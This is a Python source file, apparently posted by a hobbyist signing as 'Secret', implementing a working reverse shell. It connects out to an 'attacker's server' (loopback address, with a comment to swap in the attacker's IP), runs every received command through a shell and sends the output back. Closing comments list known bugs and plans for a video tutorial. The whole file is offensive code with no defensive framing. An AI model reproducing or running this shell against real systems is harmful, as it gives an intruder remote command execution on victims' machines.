#!/usr/bin/env python3
import socket
import subprocess
import os

# Connect to the attacker's server
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(("127.0.0.1", 1337))  # Replace with attacker's IP I am using the loop back address

# Persistent command loop that continue and only breaks with == exit

while True:
    command = client_socket.recv(4096).decode()

    if command.lower() == "exit":
        break

    # Handle 'cd' command separately
    if command.strip().lower().startswith("cd "):
        try:
            path = command.strip()[3:].strip()
            if not path:
                response = "[!] No directory specified."
            else:
                os.chdir(path)
                response = f"[+] Changed directory to {os.getcwd()}"
        except Exception as e:
            response = f"[!] Failed to change directory: {str(e)}"
        client_socket.send(response.encode())
        continue

    # Handle all other commands with subprocess
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output
    except Exception as e:
        output = str(e).encode()

    client_socket.send(output)

# Close connection
client_socket.close()




# Created by Secret 

# The only known bugs I know about so far that crash the shell are:
# Typing cd by itself cd .. works 
# Using mkdir crashed it so im guessing commands like echo or touch may not work I have not tested it yet
# I plan to make a youtube soon just need a mic or will voice over with an AI voice 
 

